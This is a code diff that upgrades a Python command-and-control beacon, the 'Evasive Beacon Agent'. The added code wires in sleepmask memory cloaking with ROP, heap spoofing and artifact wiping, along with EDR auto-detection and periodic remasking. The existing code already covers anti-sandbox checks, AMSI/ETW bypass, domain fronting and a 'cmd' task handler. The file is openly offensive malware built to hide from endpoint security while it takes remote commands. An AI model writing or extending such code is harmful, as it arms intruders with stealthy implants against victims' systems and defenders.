@@ -1,9 +1,10 @@
 """
-Evasive Beacon Agent
-Advanced C2 beacon with full EDR evasion capabilities
+Evasive Beacon Agent - Elite Edition
+Advanced C2 beacon with full EDR evasion and memory cloaking capabilities
 
 Integrates:
-- Sleep obfuscation with jitter
+- Sleep obfuscation with AI-adaptive jitter
+- Sleepmask memory cloaking (ROP + Heap Spoof + Artifact Wipe)
 - Header rotation for network evasion
 - Anti-sandbox checks before execution
 - AMSI/ETW bypass for PowerShell commands
@@ -21,7 +22,7 @@ import subprocess
 import threading
 import urllib.request
 import urllib.error
-from typing import Dict, Optional, List, Callable
+from typing import Dict, Optional, List, Callable, Any
 from dataclasses import dataclass, field
 from datetime import datetime
 
@@ -40,6 +41,22 @@ except ImportError:
     EVASION_AVAILABLE = False
     print("[!] Evasion modules not available, running in basic mode")
 
+# NEW: Import sleepmask cloaking
+try:
+    from evasion.sleepmask_cloaking import (
+        SleepmaskCloakingEngine,
+        CloakLevel,
+        EDRProduct,
+        create_elite_cloaker,
+        get_ai_recommendation
+    )
+    CLOAKING_AVAILABLE = True
+except ImportError:
+    CLOAKING_AVAILABLE = False
+    SleepmaskCloakingEngine = None
+    CloakLevel = None
+    print("[!] Sleepmask cloaking not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -56,7 +73,14 @@ class BeaconConfig:
     domain_front_host: Optional[str] = None
     traffic_profile: str = "google_search"
     max_retries: int = 3
-    evasion_level: int = 3  # 1=low, 2=medium, 3=high
+    evasion_level: int = 3  # 1=low, 2=medium, 3=high, 4=elite
+    # NEW: Sleepmask cloaking settings
+    enable_cloaking: bool = True
+    cloak_level: str = "ELITE"  # NONE, BASIC, STANDARD, ADVANCED, ELITE, PARANOID
+    enable_heap_spoof: bool = True
+    enable_artifact_wipe: bool = True
+    enable_rop: bool = True
+    remask_interval: int = 30  # Remask every N seconds during long sleeps
 
 
 @dataclass
@@ -72,10 +96,11 @@ class BeaconState:
 
 class EvasiveBeacon:
     """
-    Advanced C2 beacon with EDR evasion capabilities.
+    Advanced C2 beacon with EDR evasion and memory cloaking capabilities.
     
     Features:
     - Encrypted sleep with memory obfuscation
+    - Sleepmask cloaking (ROP + Heap Spoof + Artifact Wipe)
     - HTTP header and TLS fingerprint rotation
     - Anti-sandbox detection
     - Traffic masking (mimics legitimate apps)
@@ -101,6 +126,11 @@ class EvasiveBeacon:
             self.sandbox_detector = None
             self.traffic_masker = None
         
+        # NEW: Initialize sleepmask cloaking
+        self.cloaking_engine = None
+        if CLOAKING_AVAILABLE and config.enable_cloaking:
+            self._init_cloaking()
+        
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
             "cmd": self._handle_cmd,
@@ -123,6 +153,42 @@ class EvasiveBeacon:
         """Generate unique beacon identifier"""
         data = f"{platform.node()}-{platform.machine()}-{os.getpid()}-{time.time()}"
         return hashlib.sha256(data.encode()).hexdigest()[:16]
+    
+    def _init_cloaking(self):
+        """Initialize sleepmask cloaking engine"""
+        if not CLOAKING_AVAILABLE:
+            return
+        
+        try:
+            # Parse cloak level
+            level_map = {
+                'NONE': CloakLevel.NONE,
+                'BASIC': CloakLevel.BASIC,
+                'STANDARD': CloakLevel.STANDARD,
+                'ADVANCED': CloakLevel.ADVANCED,
+                'ELITE': CloakLevel.ELITE,
+                'PARANOID': CloakLevel.PARANOID
+            }
+            cloak_level = level_map.get(
+                self.config.cloak_level.upper(), 
+                CloakLevel.ELITE
+            )
+            
+            # Create engine with config
+            self.cloaking_engine = SleepmaskCloakingEngine(
+                auto_detect_edr=True,
+                cloak_level=cloak_level,
+                enable_heap_spoof=self.config.enable_heap_spoof,
+                enable_artifact_wipe=self.config.enable_artifact_wipe,
+                enable_rop=self.config.enable_rop
+            )
+            
+            print(f"[+] Sleepmask cloaking initialized: {cloak_level.name}")
+            print(f"    Detected EDR: {self.cloaking_engine.detected_edr}")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize cloaking: {e}")
+            self.cloaking_engine = None
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -223,23 +289,72 @@ class EvasiveBeacon:
                         3600  # Max 1 hour
                     )
             
-            # Sleep with obfuscation
+            # Sleep with obfuscation and cloaking
             self._evasive_sleep()
     
     def _evasive_sleep(self):
-        """Sleep with optional obfuscation"""
+        """
+        Sleep with memory cloaking and obfuscation.
+        
+        Stages:
+        1. Pre-sleep cloak (mask memory, create decoys, wipe artifacts)
+        2. Sleep with jitter
+        3. Remask cycles during long sleeps
+        4. Post-sleep uncloak
+        """
+        # Calculate sleep time
         if self.sleep_obfuscator:
             sleep_time = self.sleep_obfuscator.get_sleep_time()
-            print(f"[*] Sleeping {sleep_time:.1f}s (obfuscated)")
-            self.sleep_obfuscator.sleep()
         else:
-            # Basic jitter
             jitter = random.uniform(
                 -self.config.jitter_percent/100,
                 self.config.jitter_percent/100
             )
             sleep_time = self.config.sleep_time * (1 + jitter)
-            time.sleep(sleep_time)
+        
+        # Pre-sleep cloaking
+        if self.cloaking_engine:
+            cloak_result = self.cloaking_engine.pre_sleep_cloak(
+                callback=lambda stage, prog: None  # Silent callback
+            )
+            if cloak_result['success']:
+                print(f"[*] Cloaked: {cloak_result['cloaked_regions']} regions, "
+                      f"{cloak_result['heap_decoys']} decoys")
+        
+        print(f"[*] Sleeping {sleep_time:.1f}s (cloaked)")
+        
+        # Sleep with remask cycles for long sleeps
+        if self.cloaking_engine and sleep_time > self.config.remask_interval:
+            elapsed = 0
+            while elapsed < sleep_time:
+                # Sleep for one remask interval
+                chunk = min(self.config.remask_interval, sleep_time - elapsed)
+                time.sleep(chunk)
+                elapsed += chunk
+                
+                # Remask if still sleeping
+                if elapsed < sleep_time:
+                    self.cloaking_engine.remask_cycle()
+        else:
+            # Short sleep - no remask needed
+            if self.sleep_obfuscator:
+                self.sleep_obfuscator.sleep()
+            else:
+                time.sleep(sleep_time)
+        
+        # Post-sleep uncloak
+        if self.cloaking_engine:
+            self.cloaking_engine.post_sleep_uncloak()
+    
+    def get_cloaking_status(self) -> Dict[str, Any]:
+        """Get current cloaking engine status"""
+        if not self.cloaking_engine:
+            return {'available': False, 'reason': 'Cloaking not initialized'}
+        
+        return {
+            'available': True,
+            **self.cloaking_engine.get_status()
+        }
     
     def _build_request(self, endpoint: str, data: Dict = None) -> urllib.request.Request:
         """Build HTTP request with evasion techniques"""
